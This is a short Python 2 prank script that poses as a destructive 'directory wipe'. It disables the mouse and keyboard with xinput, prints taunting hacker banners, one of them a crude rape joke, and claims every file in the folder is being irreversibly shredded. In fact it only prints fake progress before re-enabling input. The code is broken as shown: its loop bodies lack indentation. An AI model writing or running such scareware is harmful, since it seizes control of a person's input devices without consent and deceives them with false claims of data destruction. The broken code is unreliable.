import os, sys, time

string = "%%%%%%%%%%"
#you can specify any directory e.g /root
path = "."

os.system("clear")
os.system("export DISPALY=:0")
#disable mouse and keyboard
os.system("xinput set-int-prop 12 'Device Enabled' 8 0")
os.system("xinput set-int-prop 11 'Device Enabled' 8 0")
dirs = os.listdir(path)
#logo
print " This Changes Nothing"
print " What's a rootkit?"
print " It's a serial rapist with a big d*"
print """ __ __ 
| / _| \ | |
| || | | \| |
| || |_| |\ |
|| \__|| \|"""
print "Mess with the best, die like the rest"
print
print "You have initiated a directory wipe"
print "This process cannot be inturrupted and cannot be reversed"
print "Atleast I warned you"
time.sleep(05)

#shredding time
for file in dirs:
print
print "Shred " + file
print "Confirm shred",
print "Y\nShredding " + file

for char in string:
sys.stdout.write(char)
sys.stdout.flush()
time.sleep(0.25)
print
#enable mouse and keyboard
os.system("xinput set-int-prop 12 'Device Enabled' 8 1")
os.system("xinput set-int-prop 11 'Device Enabled' 8 1")
